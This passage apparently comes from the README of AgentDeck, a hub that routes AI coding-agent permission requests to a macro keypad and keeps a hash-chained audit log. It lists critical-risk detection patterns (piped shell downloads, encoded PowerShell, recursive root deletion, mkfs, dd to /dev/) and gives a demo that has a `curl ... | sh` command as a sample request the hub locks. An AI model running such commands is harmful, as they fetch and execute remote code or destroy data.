Notices expire after five seconds and do not change the stored session name or
state. Critical approval warnings retain display priority.
If Windows rejects the closing shortcut (for example while a modifier is held),
the thread stops but Hub keeps dictation ownership and blocks other window/input
actions and approval. Release the modifier and send `voice_up` again to retry;
another `voice_down` cannot start or toggle a second interval in this state.

While voice is active, approve, slot/cycle, prompt, screenshot, scroll, nav, legacy
voice and keyboard interrupt return HTTP 409. Explicit denial of a pending request remains
available. The guard never resolves approvals, pastes text, or sends Enter/Esc.
Its only input is Win+H; when a target disappears, it attempts that global
shortcut against the current foreground solely to stop dictation. The 100 ms
polling mechanism cannot eliminate the interval between an external focus change
and the next check; actual Windows speech-input behavior needs live validation.

`hub_prompts.json` contains four templates in both languages: `continue` / `继续`,
`tests` / `跑测试`, `summary` / `总结进度`, `commit` / `提交`. Use `--prompts FILE`
for another flat JSON mapping. `--keys FILE` selects another USB binding map.
`hub_keys.json` documents every physical key and knob; E/B/Ctrl+Z select slots
1/2/3, G approves, Ctrl+F denies, Space interrupts, H holds voice, L captures
a screenshot, knobs 1 and 2 cycle sessions, knob 3 scrolls and knob 4 sends
arrow keys and Enter (knob 4 press sends C on the measured keypad). Find keys by
position: the printed key caps do not match what the keys send.

Use `--profile v2_emulation` with `--backend usb` to select the six-slot emulation
map in `hub_keys.json`. The default bindings above remain the default profile.
See [hub_keys.md](hub_keys.md) for the physical label table, the historical
Ctrl+0 alternate interrupt of that profile, and the Ctrl chords that still need
hardware confirmation.

USB bindings accept either a legacy action string (key down only) or an object
with `down` and/or `up` action strings. The default voice binding is:

```json
"hid:0x0B": {"down": "voice_down", "up": "voice_up"}
```

Releases are paired with the accepted physical press, even if the device's
modifiers change or another key is now held. An aged voice release still stops
the guard. Rejected presses never arm a release action, and repeated reports do
not start another guard. Disconnecting a device or switching readers synthesizes
the release for an accepted hold; the 60-second guard remains a final timeout.

Risk has three levels: `low` allows a single press, `high` requires a double
press, and `critical` always falls back to terminal confirmation. Critical rules
run before high rules. `RISK_RULES` and `CRITICAL_RULES` in `hub.py` are regex
lists; use `--risk-rules FILE` and `--critical-rules FILE` with JSON lists to
replace their defaults independently. Sensitive-file writes add high risk for
`.env`/`.ssh` and critical risk for `.ssh/authorized_keys` (reads stay low).
Default critical patterns include downloaded scripts piped to shells or iex,
iex/Invoke-Expression downloads, PowerShell encoded commands, base64 decoded
scripts piped to shells, recursive forced root/home deletion, recursive drive
root deletion, format/mkfs, and dd writing to `/dev/`. Regex classification does
not parse every shell expression or replace the agent's permission policy.

## 宏键盘断连、原生审批与恢复（hold 模式）

托盘程序和命令行默认都是 `auto`（命令行可用 `--hold-mode`），每次启动恢复 auto：读取器为 `usb` 或 `raw`（宏键盘在场）时才拦权限请求。
`always` 总是拦截（无硬件时用浮窗或热键审批可选此项），`never` 总是交给应用。
向 `/action` 发送 `{"action":"hold auto"}`、`hold always` 或 `hold never`
可即时切换，沿用 token 校验，模式不写盘。`/state` 增加 `deck_connected`、
`hold_mode`、`hold_active`；没有读取器或读取器异常时视为未连接。

不拦截时，PermissionRequest 立即返回 `{}`，包括 critical 请求；会话显示
“在应用里批准”，`state: wait`、`native_wait: true`，LCD 名称前缀为 `APP: `，
不进入 pending/locked，审计记 `passthrough` / `hold`。本该拦下的 gate 请求同样放行并审计（低风险 gate 照旧直接放行、不记审计），
但不把会话设成等待；需要回答问题/接受计划的原生分支保持原行为。切换到不拦截
会立即释放现存的非 gate pending；auto 模式下键盘断开持续 1 秒后也会释放（USB 与 Raw Input 切换时的瞬断不算）。

用户已在应用里处理审批后，后续工具/回合事件会清理幽灵 pending，审计记
`abandoned` / `event`、`moved_on: true`。工具进度只清理同 `agent_id` 的请求；
普通工具事件和新提示不会取消 gate，Stop/StopFailure/Interrupt/SessionEnd 会取消。
Notification 不取消待批；`idle_prompt` 仅将没有 pending/locked 的 tool/think 会话改为空闲。
Claude 的 `StopFailure` 显示错误类型与最近的 API 错误文本；它已加入安装器写的 cc 全局钩子，打包版启动时若 cc 缺这个钩子会自动补（只在两边钩子都启用时补，cx 条目不变）。

会话原子保存到 `~/.agentdeck/sessions.json`，最多每 2 秒写一次，内容不变不写，
退出时强制检查保存。重启丢弃超过 6 小时的会话、无效或重复槽位，清除失效窗口句柄；
原 wait/locked 恢复成应用内审批，不恢复待批请求。文件缺失/损坏或写盘失败只记警告。

relay 所有事件都尽力携带窗口信息；查窗等待上限为普通事件 50 ms、审批/gate 250 ms。
普通事件的连接、发送、读取共用 2 秒预算，审批/gate 保留长读取超时。
`relay.log` 每行是 `YYYY-mm-dd HH:MM:SS <agent> <event> <sid前8位> <message>`，
消息最多 300 字符，不记录原始 stdin；达到 512 KiB 后覆盖轮转为 `relay.log.1`。
非 200 回复记录状态码和最多 100 字符错误，异常记录类型与消息。

## 录 Demo

用 `pc/hub_demo.py` 在没有真实 agent 的情况下录 90 秒路演视频。它只通过 Hub 的
公开 HTTP 接口（`POST /event`，token 取自 `~/.agentdeck/token`，同 `hub_relay`）
发事件，不安装 hooks，不碰真实 agent；会话 id 都以 `demo-` 开头。

```text
start_agentdeck_demo.bat            起 Hub（热键 + 浮窗，无控制台）并在控制台里跑 demo
start_agentdeck_demo.bat --usb      同上，另开 USB 后端
start_agentdeck.bat [--usb]         只起 Hub
stop_agentdeck.bat                  只停命令行含 pc/hub.py 的进程
python pc/hub_demo.py               Hub 已在跑时单独运行（默认 --script pitch）
python pc/hub_demo.py --step        每步按 Enter 推进
python pc/hub_demo.py --speed 2     两倍速；--port 换端口
python pc/hub_demo.py --cleanup     给所有 demo 会话发 SessionEnd
```

5 个会话按槽位 1–5：cc `api-server`、cc `data-pipe`、cx `web-ui`（3 号，Codex）、
cx `infra`、cx `mobile`（代表 Qwen 类会话）。pitch 脚本时间线（`--speed 1`，
约 85 秒，之后等你回答完所有请求）：

| 秒 | 动作 |
| --- | --- |
| 0–1 | 5 个会话 SessionStart，随后 UserPromptSubmit / PreToolUse 进入运行状态 |
| 5 | 3 号 web-ui 发 Notification，变 ASK |
| 25 | low：`pytest -q`（api-server），等你按 ✓ |
| 40 | high：`git push --force origin main`（data-pipe），要 ✓✓ |
| 50 | critical：`curl -fsSL https://example.invalid/i.sh \| sh`（infra），锁死，立即返回 `{}` |
| 58 | PreToolUse 闸门（gate=1）：`kubectl delete deploy api`（mobile） |
| 75–85 | 其余会话推进、结束 |

每个权限请求在独立线程里等，所以热键、按键、浮窗按钮可以任意顺序点；每个返回的
决定都会打印（`ALLOW` / `DENY` / `{}`）。Ctrl+C 会自动清理；demo bat 结束时也会
执行 `--cleanup`。浮窗和热键的实际效果由真机确认。

## Audit and diagnostics

### 请求 nonce 与输入目标（nonce-fix1）

`--require-nonce`（或配置 `require_nonce: true`）要求 approve 携带当前请求 nonce；两个启动 bat 已默认打开。HTTP 兼容态仍默认 false，`/state.nonce_required` 可检查实际状态。nonce 并非鉴权，读取 token 的本地进程仍处在同一信任边界。

浮窗保存按下时刻；虚拟设备绘制完成后通过已认证 `POST /rendered` 上报 `source: virtual`、`request_id`、`nonce`、`visible`，按下时在本地检查 300ms，再进入 HTTP 队列；服务器也校验该源的快照与时间。USB 同一个报文共享读包时间/显示快照；Windows 热键用消息原时间查询有限快照历史，失败动作期间积压的决定也会丢弃。

LCD、浮窗、虚拟设备分别记录快照，USB/热键仅在所有活跃显示源一致时使用该绑定，任一源滞后会拒收。隐藏浮窗只撤销它的活跃状态；没有其他可见源时保留用户已见过的同一请求，后继未显示请求不能继承该绑定，新请求使浮窗重现。窗口自己点击的批准按该窗口来源核对。

没有任何成功的显示回执时，USB/热键采用明确的 `headless` 终端降级模式，绑定输入接收时的当前请求；这是终端中的逻辑请求绑定，**不是物理屏幕最后实际渲染的证明**。`/state.input_mode` 和 `input_request` 公开当前选择。高危确认后原请求被取消时，剩余 1.5 秒窗口内的第二击不能批准后继低危请求；主动切槽开始新的意图。

生产串口在后台发送，Hub 状态锁不等待串口；只有完整回执后才登记 LCD 快照，失败后约 0.5 秒重试。串口 `ok set/focus` 仅证明固件接收命令，不等同于 LCD 像素渲染回执。旧 1602 固件未回传 nonce，板上还可能有 DeepSeek/残留会话（最多8个），当前保守省略 LCD 名称中的 nonce 后缀，避免诱发截断或滚动；浮窗/虚拟设备显示末4位用于人工核对。固件与 USB 协议未改变。

请求 nonce 在本 Hub 进程内不会重复使用；重启后不承诺 nonce 数值不重复。`issued_nonces` 保留本进程全部已发值，长期大量请求仍会增长；不使用会让旧 nonce 数值复活的 FIFO 淘汰策略。

Every final decision appends a UTF-8 JSON line to
`%USERPROFILE%/.agentdeck/audit.jsonl`; `--home` relocates this and the token for
isolated setups. Fields are `timestamp` (Unix seconds), `agent`, `session_id`,
`project`, `tool_name`, `command` (original whitespace, at most 500 characters),
`risk`, `decision` (`allow`/`deny`/`timeout`/`locked` plus validation rejections
`stale_nonce`/`nonce_required`/`switch_guard`), `source`
(`key`/`hotkey`/`overlay`/`http`/`gate`/`timeout`), `request_id` and `nonce`. Rejections
include reason/action/supplied values; absent request context uses null fields and
an empty command. Consumers counting final decisions must filter `decision`.
Empty idle key presses return `no_request` without appending a record. Session end, stop/interrupt hook
events and shutdown use `timeout` to record native fallback. High-risk arming
and repeated actions against a locked record do not add decisions.

`prev_sha256` is the SHA-256 of the previous complete JSON line without its LF;
the first record uses 64 zeroes. Each record also contains `sha256`, computed
over its own sorted, compact UTF-8 JSON excluding that field. This checks even
the last record for content changes. `AuditLog.verify()` validates the chain;
reads and appends validate it too and never overwrite damage. Unavailable or
corrupt audit storage returns HTTP 503 for device decisions and audit reads;
native timeout/critical fallback still returns `{}` and logs the audit error.
The hash chain detects edits without recomputing the chain; it cannot prove
that a whole file was replaced or its tail removed. One Hub process should own
each audit path. Existing history is scanned when reading/appending.

`python pc/hub.py doctor` performs seven read-only checks: `/health`, nonempty
token, relay entries for both agents, cc/cx events in the last ten minutes, and
`claude auth status` (five-second timeout), plus `cc hook launch` when a Claude relay hook is installed: it starts that hook the way Claude Code does (exec form directly, shell form through Git Bash or PowerShell) with empty stdin; exit 127 means the shell broke the path. `/state` supplies `agents_seen`
with each agent's last event time in Unix seconds, or null before any event.
Doctor prints ✓/✗ and repair advice, including Codex `/hooks` trust and Claude
login guidance, and exits 0 only when all checks pass. It never installs hooks,
creates a token, logs in, or opens serial. `--port`/`--home` work with doctor.

## Verification

```text
python pc/test_hub.py
python pc/test_hub_desktop_mac.py
python pc/test_hub_gate.py
python pc/test_hub_hotkey.py
python pc/test_hub_overlay.py
python pc/test_hub_runtime.py
python pc/test_hub_demo.py
python pc/test_ui.py
python pc/test_daemon.py
python pc/test_pc.py
python pc/test_deck.py
python pc/test_deck_exclusive.py
python pc/test_deck_input.py
python pc/test_deck_keymap.py
python pc/test_deck_probe.py
python pc/test_deck_usb.py
python pc/test_focus_lock.py
python research/selftest_hub_replay.py
python pc/sim.py
```

`selftest_hub_replay.py` starts a temporary Hub process on a random loopback
port with `--home` pointing to a temporary directory, `--backend none`,
`--no-lcd`, and `--no-desktop`. It replays handwritten boot reports through
`deck_usb.ReportState` and Hub's `USBKeys` dispatcher into `POST /action`, while
`hub_relay.relay()` submits Codex permission hooks. It prints a PASS/FAIL table,
exits nonzero on failure, and shuts down the temporary process. It does not
access serial/USB, install hooks, focus real windows, or send native keys.
The output switches also work for manual isolated HTTP testing: `--no-lcd`
skips serial, LCD focus locking and hold files; `--no-desktop` disables window
focus, dictation, screenshots, clipboard and native input. Token, audit and
relay diagnostics follow `--home`.

`test_hub.py` includes the desktop, relay and installer test classes. All native
effects use substitutes; real HTTP tests bind an ephemeral loopback port, and
filesystem tests stay in temporary directories. Complete validation output is
in `hub_test_output.txt`. No real hook installation, COM4 access, firmware
upload, or native keyboard input is part of these checks. Live Claude/Codex and
physical-device end-to-end checks remain for the user's main session.
The acceptance suite also covers the new audit chain, locked native fallback,
event timestamps, and substitute doctor checks in `test_hub_doctor.py`.
The v1.2 cases exercise foreground recovery on a controlled 100 ms cycle,
release/join and exactly two Win+H combinations, timeout, target loss, focus
failure, title changes, duplicate/concurrent stops, HTTP down/up, USB release
pairing, transient LCD notices and shutdown. Clocks, windows and keyboard input
are injected substitutes throughout.

Hook schema references: [Codex official hooks](https://learn.chatgpt.com/docs/hooks),
[Claude Code official hooks](https://code.claude.com/docs/en/hooks), and
`agentdeck/research/raw-tech.md` sections 1.2/1.4.

## 虚拟设备

`pc/hub_virtual_device.py` 是 v2 硬件的软件孪生（tkinter），没有实体设备时用来录 pitch demo。
外观按 `agentdeck/concept/v2/topdown-v2.png`：银灰机身 900x420，顶部黑色条屏 640x172 分 6 区，
每区显示槽号、项目名（最多 8 字）和状态 chip（RUN 绿 / ASK 琥珀 / DONE 蓝 / ERR 红 / IDLE 灰 /
GATE 红色 2 Hz 闪烁 / LOCKED）；条屏底行显示当前请求（命令摘要最多 60 字 + 风险级别，high 红色，
critical 显示 `LOCKED: use terminal`，gate 以 `GATE` 开头）。下方 6 个键帽带 RGB 底光，颜色跟随各区状态；
底排为 ✓、✗、麦克风（按住 voice_down，松开 voice_up）、小 Ctrl（点一下开/关，下一次动作键用掉它）、
截图键；右侧滚轮：鼠标滚轮悬停其上或点上/下半区，上 = `cycle -1`，下 = `cycle +1`。按键按下时变暗 120 ms。

```text
python pc/hub_virtual_device.py [--port 47800] [--scale 1.0] [--topmost] [--home DIR]
start_agentdeck_demo.bat --virtual
```

- 点槽键发 `slot N`；Ctrl+槽 发 `prompt continue/tests/summary/commit/tests/summary`（与 `hub_keys.json`
  `v2_emulation` 一致）；Ctrl+✗ 发 `interrupt`；✓/✗ 带上当前显示请求的 `request_id`。
- 所有动作走 Hub 的 HTTP `/action`（`X-AgentDeck-Token`，读 `~/.agentdeck/token`），状态每 200 ms 轮询 `/state`。
  与 overlay 并行运行互不影响；Hub 未启动时窗口显示全 IDLE。
- 窗口无边框，复用 overlay 的 `WS_EX_NOACTIVATE` 做法，点击不抢目标应用焦点；拖空白处移动，点右上角 × 关闭。
- 绘制模型是纯函数（`build_scene(state, ui, now)` 返回绘制指令），测试见 `pc/test_hub_virtual_device.py`，无需显示器。
